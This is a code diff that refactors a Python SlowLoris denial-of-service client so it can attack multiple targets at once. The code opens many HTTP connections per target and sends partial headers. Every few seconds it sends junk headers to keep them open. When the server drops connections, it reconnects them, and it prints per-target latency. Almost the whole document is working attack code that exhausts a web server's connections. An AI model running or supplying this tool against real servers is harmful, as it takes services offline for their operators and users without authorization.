@@ -12,54 +12,61 @@ class SlowLoris:
     """SlowLoris attack client."""
 
     def __init__(self):
-        self.connections = []
-        self.recreated_connections = 0
-        self.connections_dropped = False
+        self.targets = []
         self.keepalive_thread = threading.Thread(target=self.keep_alive)
         self.keepalive_thread.setDaemon(True)
         self.keepalive_thread.start()
 
-    def attack(self, host, port, count):
+    def attack(self, target):
         """Starts the attack."""
-        print("Initializing up to {} connections.".format(count))
+        self.targets.append(target)
+        print("[{}] Initializing {} connections.".format(target.host, target.count))
         # Start 'count' connections and send the initial HTTP headers.
-        for i in range(count):
-            if i == count // 10 and not self.connections_dropped:
-                print("Be patient, this could take some time.")
-            conn = LorisConnection(host, port).send_headers(DEFAULT_USER_AGENT)
-            self.connections.insert(0, conn)
+        for i in range(target.count):
+            conn = LorisConnection(target, True).send_headers(DEFAULT_USER_AGENT)
+            target.connections.insert(0, conn)
+            if i == target.count - 1:
+                print("[{}] All connections initialized.".format(target.host))
 
     def stop(self):
         """Stops the attack."""
-        for conn in self.connections:
-            conn.close()
+        for target in self.targets:
+            print("[{}] Shutting down all connections.".format(target.host))
+            for conn in target.connections:
+                conn.close()
 
     def keep_alive(self):
         """Make sure that connections stay alive once established."""
         while True:
             time.sleep(5)
-            connection_count = len(self.connections)
-            # print("Sending keep-alive headers for {} connections.".format(connection_count))
-            # Every 10 seconds, send HTTP nonsense to prevent the connection from timing out.
-            for i in range(0, connection_count):
-                try:
-                    self.connections[i].keep_alive()
-                except KeyboardInterrupt:
-                    raise
-                # pylint: disable=W0702
-                # If the server closed one of our connections,
-                # re-open the connection in its place.
-                except:
-                    if not self.connections_dropped:
-                        self.connections_dropped = True
-                        print("Host started dropping connections.")
-                    threshold = 5
-                    if self.recreated_connections >= threshold:
-                        print("Reconnected {} dropped connections."
-                              .format(self.recreated_connections))
-                        self.recreated_connections -= threshold
-                    host, port = (self.connections[i].host, self.connections[i].port)
-                    conn = LorisConnection(host, port).send_headers(DEFAULT_USER_AGENT)
-                    if conn.is_connected:
-                        self.connections[i] = conn
-                        self.recreated_connections += 1
+            # Iterate over all targets.
+            for target in self.targets:
+                # Print latest latency.
+                latency = target.get_latency()
+                if latency != None:
+                    print("[{}] Current latency: {:.2f} ms".format(target.host, latency))
+                connection_count = len(target.connections)
+                # Every 10 seconds, send HTTP nonsense to prevent the connection from timing out.
+                for i in range(0, connection_count):
+                    try:
+                        target.connections[i].keep_alive()
+                    # If the server closed one of our connections,
+                    # re-open the connection in its place.
+                    # pylint: disable=W0702
+                    except:
+                        # Notify the user that the host started dropping connections
+                        # if this connection was the first one being dropped.
+                        if target.dropped_connections == 0:
+                            print("[{}] Server started dropping connections.".format(target.host))
+                        target.dropped_connections += 1
+                        # Notify the user about the amount of reconnections.
+                        threshold = 10
+                        if target.reconnections >= threshold:
+                            print("[{}] Reconnected {} dropped connections."
+                                  .format(target.host, target.reconnections))
+                            target.reconnections = 0
+                        # Reconnect the socket.
+                        conn = LorisConnection(target).send_headers(DEFAULT_USER_AGENT)
+                        if conn.is_connected:
+                            target.connections[i] = conn
+                            target.reconnections += 1
